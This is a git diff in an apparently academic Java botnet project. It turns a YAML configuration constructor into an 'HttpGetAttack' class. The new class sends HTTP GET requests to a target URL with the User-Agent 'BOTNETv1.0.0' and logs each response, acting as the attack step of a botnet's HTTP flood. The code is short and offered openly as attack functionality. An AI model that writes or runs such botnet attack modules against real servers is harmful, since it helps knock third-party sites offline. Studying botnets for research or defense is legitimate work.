@@ -24,51 +24,39 @@
  * THE SOFTWARE.
  */
 
-package com.acmutv.botnet.config;
+package com.acmutv.botnet.attack;
 
-import com.acmutv.botnet.target.HttpTargetProxy;
 import com.acmutv.botnet.target.HttpTarget;
-import org.yaml.snakeyaml.TypeDescription;
-import org.yaml.snakeyaml.constructor.Constructor;
+import com.acmutv.botnet.tool.LoggerTools;
+
+import java.io.IOException;
+import java.net.*;
+import java.util.Random;
 
 /**
- * This class realizes the constructor for the SnakeYaml Parser, intended to the parsing of the
- * YAML configuration file.
- *
- * This class is implemented as a singleton.
+ * This class realizes a HTTP GET attack.
  * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
  * @author Michele Porretta {@literal <mporretta@acm.org>}
  * @since 1.0
- * @see BotConfigurator
- * @see BotConfiguration
- * @see org.yaml.snakeyaml.Yaml
- * @see Constructor
- * @see TypeDescription
+ * @see HttpAttack
  */
-public class YamlConstructor extends Constructor {
+public class HttpGetAttack extends HttpAttack {
 
-  private static YamlConstructor instance;
-
-  /**
-   * Initializes the singleton instance of the class.
-   * @return the singleton instance of the class.
-   */
-  public static YamlConstructor getInstance() {
-    if (instance == null) {
-      instance = new YamlConstructor();
-    }
-    return instance;
+  public HttpGetAttack(HttpTarget target, Random rndgen) {
+    super(target, rndgen);
   }
 
-  /**
-   * Creates the singleton of the class.
-   */
-  private YamlConstructor() {
-    super(BotConfiguration.class);
-    TypeDescription description = new TypeDescription(BotConfiguration.class);
-    description.putListPropertyType("targets", HttpTarget.class);
-    description.putListPropertyType("proxy", HttpTargetProxy.class);
-    description.putListPropertyType("sleep", String.class);
-    super.addTypeDescription(description);
+  public HttpGetAttack(HttpTarget target) {
+    super(target, new Random());
   }
+
+  public void makeAttack(final URL url) throws IOException {
+    HttpURLConnection http = (HttpURLConnection) url.openConnection();
+    http.setRequestMethod("GET");
+    http.setRequestProperty("User-Agent", "BOTNETv1.0.0");
+    int response = http.getResponseCode();
+
+    LoggerTools.info(String.format("HTTP-ATTACK :: GET %s :: %s", url, response));
+  }
+
 }
